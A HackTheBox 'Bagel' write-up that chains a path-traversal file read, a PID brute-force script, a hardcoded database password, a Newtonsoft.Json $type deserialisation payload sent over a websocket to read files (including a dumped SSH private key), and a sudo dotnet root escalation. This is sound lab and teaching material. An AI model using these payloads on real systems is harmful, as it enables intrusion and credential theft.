---
layout:     "single"
title:      "HackTheBox - Bagel"
date:       2023-06-03
author:     "D4mianwayne"
tags:    ["python", "sqlmap", "web-app", "dotnet", "DLL", "deserialisation", "NewtonSoft", "websocket"]
categories: ["HackTheBox"]
---


WriteUp for HackTheBox Bagel machine.

<!-- more -->

Starting off with the `nmap` scan, we can it has 3 ports open (it missed one more port which was open due to some issue):

Checking the HTTP port, we see it is more of a static site, one thing that caught my eye was the `page` parameter in the URI:

![](/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled.png)

Capturing the request and checking in the burp suite for LFI resulted in success and we could see the `/etc/passwd` file contents ini the response: 

![](/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_1.png)

Checking for the current process, we see that it is running from the `developer` user’s directory and it is probably a `flask` application:

![](/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_2.png)

We can retrieve the contents of the `[app.py](http://app.py)` :

![](/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_3.png)

Checking the `[app.py](http://app.py)` code, we see that it has an endpoint `orders` which connects to the websocket running on the port `5000` and sends a JSON body as a part of the request, we also notice that there is a comment mentioning another file which is responsible for handling the websocket request and it is build with `dotnet` 

```jsx
from flask import Flask, request, send_file, redirect, Response
import os.path
import websocket,json

app = Flask(__name__)

@app.route('/')
def index():
        if 'page' in request.args:
            page = 'static/'+request.args.get('page')
            if os.path.isfile(page):
                resp=send_file(page)
                resp.direct_passthrough = False
                if os.path.getsize(page) == 0:
                    resp.headers["Content-Length"]=str(len(resp.get_data()))
                return resp
            else:
                return "File not found"
        else:
                return redirect('http://localhost:8000/?page=index.html', code=302)

@app.route('/orders')
def order(): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
    try:
        ws = websocket.WebSocket()    
        ws.connect("ws://127.0.0.1:5000/") # connect to order app
        order = {"ReadOrder":"orders.txt"}
        data = str(json.dumps(order))
        ws.send(data)
        result = ws.recv()
        return(json.loads(result)['ReadOrder'])
    except:
        return("Unable to connect")

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=8000)

curl -i -s -k -X $'GET' \
    -H $'Host: bagel.htb:8000' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    $'http://bagel.htb:8000/?page=../../../../.Dockerfile'
```

Since there is no filename or path which was disclosed, given the LFI the best bet we have on this is to run a PID bruteforce with a script and get the `cmdline` information, following script does the work:

```jsx
#!/bin/bash

for i in {0..999}; do
    pid=$i
    url="http://bagel.htb:8000/?page=../../../../../proc/$pid/cmdline"
    curl -s "$url" | tee -a log.txt
    echo ""
done
```

Running the script I see that there is a `bagel.dll` running with `dotnet` , since we have the absolute path of the file, we can download it via the LFI

![](/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_4.png)

```jsx
❯ wget http://bagel.htb:8000/\?page\=../../../../../../opt/bagel/bin/Debug/net6.0/bagel.dll
--2023-04-19 18:11:06--  http://bagel.htb:8000/?page=../../../../../../opt/bagel/bin/Debug/net6.0/bagel.dll
Resolving bagel.htb (bagel.htb)... 10.10.11.201
Connecting to bagel.htb (bagel.htb)|10.10.11.201|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10752 (10K) [application/octet-stream]
Saving to: ‘index.html?page=..%2F..%2F..%2F..%2F..%2F..%2Fopt%2Fbagel%2Fbin%2FDebug%2Fnet6.0%2Fbagel.dll’

index.html?page=..%2F..%2F..% 100%[================================================>]  10.50K  --.-KB/s    in 0s      

2023-04-19 18:11:06 (48.7 MB/s) - ‘index.html?page=..%2F..%2F..%2F..%2F..%2F..%2Fopt%2Fbagel%2Fbin%2FDebug%2Fnet6.0%2Fbagel.dll’ saved [10752/10752]

❯ mv index.html\?page=..%2F..%2F..%2F..%2F..%2F..%2Fopt%2Fbagel%2Fbin%2FDebug%2Fnet6.0%2Fbagel.dll bagle.dll
```

Now, it is time to analyze the DLL file using `dnSpy`

### Analysing the `bagel.dll`

Checking the `bagel.dll` , it wasn’t big file so had limited number of classes and methods, one of the class was named as `DB`, it contained the SQL credentials for the `dev` user

![](/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_5.png)

```jsx
using System;
using Microsoft.Data.SqlClient;

namespace bagel_server
{
	// Token: 0x0200000A RID: 10
	public class DB
	{
		// Token: 0x06000022 RID: 34 RVA: 0x00002518 File Offset: 0x00000718
		[Obsolete("The production team has to decide where the database server will be hosted. This method is not fully implemented.")]
		public void DB_connection()
		{
			string text = "Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K";
			SqlConnection sqlConnection = new SqlConnection(text);
		}
	}
}
```

Since we already identified that there was a user named as `developer` , we might be able to SSH to the machine but it wasn’t working as the SSH server does not seem to accept the password from the remote user:

```jsx
❯ ssh developer@bagel.htb
developer@bagel.htb: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
```

During the process dumping, I identified that `gssproxy` is running as well, a little bit insight into the GSSAPI:

- **Gssapi-keyex**: This authentication method uses the Generic Security Services Application Program Interface (GSSAPI) to authenticate the client. It negotiates a secure key exchange protocol to create a shared secret between the client and server.
- **Gssapi-with-mic**: This authentication method uses GSSAPI to authenticate the client, but it also includes a message integrity check (MIC) to ensure the authenticity of the message.

<aside>
💡

GSSAPI is a generic security API used to authenticate client/server applications. GSSProxy is a service that allows users to obtain GSSAPI credentials on behalf of a service without having direct access to the user's keytab.

The GSSProxy service is commonly used in environments where centralized authentication and authorization mechanisms are required, such as in large-scale enterprise networks. By acting as a proxy between a client application and the Kerberos authentication system, GSSProxy provides a secure and efficient way to obtain Kerberos credentials for a particular service.

GSSProxy is implemented as a daemon process that runs on the client machine and communicates with the Kerberos authentication system. When a client application needs to authenticate with a service, it sends a request to GSSProxy, which then acquires the necessary credentials on behalf of the client and returns them to the application.

In summary, GSSProxy is a service that provides a secure and efficient way to obtain GSSAPI credentials for a particular service, without requiring direct access to the user's keytab.

</aside>

It seems that we won’t be able to authenticate to the SSH without any key or any GSSAPI key, digging deeper into the DLL file, we see that it accepts the JSON data and pass it to `handler.Deserialise` method to parse the JSON data:

![](/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_6.png)

Checking the `handler` class and the `deserialise` method is making use of the `Newtonsoft.Json` class, since there is no explicit `TypeHandling` was defined i.e. `4` is not a valid constant value for the `TypeHandling` , this is vulnerable to Deserialisation attack, check the Source Code Analysis note for better insight:

![](/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_7.png)

As we can interact with the websocket, what we can do is, due to insecure deserialisation, we can craft a payload for performing deserialisation attack. We can interact to the service using following script:

```jsx
#!/usr/bin/python3

import websocket
import json

def order(data): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
    try:
        ws = websocket.WebSocket()    
        ws.connect("ws://10.10.11.201:5000/") # connect to order app
        order = {"ReadOrder":data}
        data = str(json.dumps(order))
        ws.send(data)
        result = ws.recv()
        return(json.loads(result))
    except Exception as E:
        print(E)
        return("Unable to connect")

print(order("orders.txt"))
```

Running the script with different inputs for the `data` , it works quite well:

```jsx
❯ python3 interact_bagel.py
{'UserId': 0, 'Session': 'Unauthorized', 'Time': '8:20:01', 'RemoveOrder': None, 'WriteOrder': None, 'ReadOrder': 'Order not found!'} - ../../../../etc/passwd
❯ python3 interact_bagel.py
{'UserId': 0, 'Session': 'Unauthorized', 'Time': '8:20:17', 'RemoveOrder': None, 'WriteOrder': None, 'ReadOrder': 'Order not found!'} - ../../../.././etc/hosts
❯ python3 interact_bagel.py
{'UserId': 0, 'Session': 'Unauthorized', 'Time': '8:20:24', 'RemoveOrder': None, 'WriteOrder': None, 'ReadOrder': 'abc'} - ../../../../../../orders.txt
```

There is a method called `RemoveOrder` which does not have any objects defined in it like other methods

![](/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_8.png)

There was another class named as `File` containing a method called `ReadFile` which could be the perfect target for the attack as we can retrieve any arbitrary file:

![](/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_9.png)

Now, we can craft the payload as follows:

```jsx
{"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile": data}}
```

`RemoveOrder` is one of the methods we can call, using the `$type` , we can specify `bagel_server.File, bagel` such as we will be calling a method from that specific location i.e. `ReadFile` , lastly the `data` is the argument for the `ReadFile` 

```jsx
#!/usr/bin/python3

import websocket
import json

def order(data): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
    try:
        ws = websocket.WebSocket()    
        ws.connect("ws://10.10.11.201:5000/") # connect to order app
        order = {"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile": data}}
        data = str(json.dumps(order))
        ws.send(data)
        result = ws.recv()
        return(json.loads(result))
    except Exception as E:
        print(E)
        return("Unable to connect")

print(order("../../../../../../../etc/passwd"))
```

Checking it with the `/etc/passwd` , it worked like a charm

```jsx
❯ python3 interact_bagel.py

{'UserId': 0, 'Session': 'Unauthorized', 'Time': '8:54:05', 'RemoveOrder': {'$type': 'bagel_server.File, bagel', 'ReadFile': 'root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\ngames:x:12:100:games:/usr/games:/sbin/nologin\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\nnobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin\ndbus:x:81:81:System message bus:/:/sbin/nologin\ntss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin\nsystemd-network:x:192:192:systemd Network Management:/:/usr/sbin/nologin\nsystemd-oom:x:999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin\nsystemd-resolve:x:193:193:systemd Resolver:/:/usr/sbin/nologin\npolkitd:x:998:997:User for polkitd:/:/sbin/nologin\nrpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\nabrt:x:173:173::/etc/abrt:/sbin/nologin\nsetroubleshoot:x:997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin\ncockpit-ws:x:996:994:User for cockpit web service:/nonexisting:/sbin/nologin\ncockpit-wsinstance:x:995:993:User for cockpit-ws instances:/nonexisting:/sbin/nologin\nrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin\nchrony:x:994:992::/var/lib/chrony:/sbin/nologin\ndnsmasq:x:993:991:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin\ntcpdump:x:72:72::/:/sbin/nologin\nsystemd-coredump:x:989:989:systemd Core Dumper:/:/usr/sbin/nologin\nsystemd-timesync:x:988:988:systemd Time Synchronization:/:/usr/sbin/nologin\ndeveloper:x:1000:1000::/home/developer:/bin/bash\nphil:x:1001:1001::/home/phil:/bin/bash\n_laurel:x:987:987::/var/log/laurel:/bin/false', 'WriteFile': None}, 'WriteOrder': None, 'ReadOrder': None}
```

Next, we can get the private key of the `phil` user which we can use for SSH:

```jsx
❯ python3 interact_bagel.py

{'UserId': 0, 'Session': 'Unauthorized', 'Time': '8:55:19', 'RemoveOrder': {'$type': 'bagel_server.File, bagel', 'ReadFile': '-----BEGIN OPENSSH PRIVATE KEY-----\n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\nnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=\n-----END OPENSSH PRIVATE KEY-----', 'WriteFile': None}, 'WriteOrder': None, 'ReadOrder': None}
❯ echo '-----BEGIN OPENSSH PRIVATE KEY-----\n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\nnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=\n-----END OPENSSH PRIVATE KEY-----' > id_rsa_phil
```

Now, we can successfully login to the machine as `phil` 

![](/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_10.png)

Now using the `dev` user’s password we got from the `DB` class of the `bagel.dll` , we can escalate to the `developer` user

![](/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_11.png)

Doing `sudo -l` , we can see that we are allowed to run `/usr/bin/donet` as user `root`

```jsx
[developer@bagel ~]$ sudo -l
Matching Defaults entries for developer on bagel:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin

User developer may run the following commands on bagel:
    (root) NOPASSWD: /usr/bin/dotnet
```

Checking GTFO bins, we can see spawn an interactive shell and then use `System.Diagnostic.Process.Start` method spawn any child process, now since `donet` was running as root, we were able to get the shell as `root`

[https://gtfobins.github.io/gtfobins/dotnet/](https://gtfobins.github.io/gtfobins/dotnet/)

![](/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_12.png)


